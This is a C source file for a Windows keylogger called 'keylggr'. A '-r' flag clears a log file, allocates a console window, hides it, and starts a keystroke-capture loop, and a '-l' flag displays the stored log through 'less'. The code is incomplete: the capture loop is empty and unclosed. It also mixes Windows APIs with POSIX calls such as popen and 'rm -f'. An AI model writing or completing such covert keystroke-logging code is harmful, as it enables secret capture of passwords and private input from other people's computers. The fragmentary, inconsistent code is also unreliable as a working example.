#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winuser.h>
#include <unistd.h>

#define CLN_OPT  "rm -f output.txt"
#define CONS_WIN "ConsoleWindowClass"
#define OPT_FILE "output.txt"
#define OPT_STR  "lr"

// prints error message and exits the program.
void errexit (const char *errmsg) {
  printf ("%s\n", errmsg);
  exit (EXIT_FAILURE);
}

// opens the last record of .output in less.
void lopen () {
  FILE *fptr = popen ("less", "w");
  FILE *lptr = fopen (OPT_FILE, "r");
  char *line = NULL;
  int status;
  size_t len = 0;
  ssize_t nread;
  
  // checking for error opening files.
  if (fptr == NULL || lptr == NULL) {
    errexit ("Error Opening File.");
  }
  
  // reading input from log into fptr.
  while ((nread = getline (&line, &len, lptr)) != -1) {
    fwrite (line, nread, 1, fptr);
  }
  
  // closing the file pointers.
  fclose (lptr);
  status = pclose(fptr);
  if (status == -1) {
    errexit ("Error Closing File.");
  }
}

// records new keystrokes.
void rmode () {
  FILE *lptr = NULL;
  HWND window = NULL;
  char c;
  
  // cleans the last record of .output so that new keystrokes can be logged.
  system (CLN_OPT);
  
  // initializing lptr (the log where keystrokes are stored).
  if ((lptr = fopen (OPT_FILE, "w")) == NULL) {
    errexit ("Error Opening File.");
  }
  
  // allocating new window for keylogging.
  AllocConsole();
  window = FindWindowA (CONS_WIN, NULL);
  if (window == NULL) {
    errexit ("Window Creation Failed.");
  }
  ShowWindow (window, 0);
  
  // keylogging.
  while (true) {
    
}

// main method: parses the command line arguments and takes appropriate action
int main (int argc, char **argv) {
  int opt = 0;
  int lflag = 0; // get log of the last keystrokes stored by keylggr
  int rflag = 0; // re-initialize keylggr (clearing out old data)
  
  // clean previous output if it exists.
  
  // parse command line arguments.
  while ((opt = getopt (argc, argv, OPT_STR)) != EOF) {
    switch (opt) {
      case 'l':
        lflag++;
        break;
      case 'r':
        rflag++;
        break;
      default:
        errexit ("INVALID ARGS: usage ./keylggr <-l | -r &>");
    }
  }
  
  // validate command line argumets: should be either -l or -r, NOT both.
  if (!(lflag ^ rflag)) {
    errexit ("INVALID ARGS: usage ./keylggr <-1 | -r &>");
  }
  
  // if l flag is set, retrieve the log of the last keystrokes stored.
  if (lflag) {
    lopen ();
  }
  
  // if r mode is set, clear previously stored keystrokes and record new strokes.
  if (rflag) {
    rmode ();
  }
  
  exit (EXIT_SUCCESS);
}
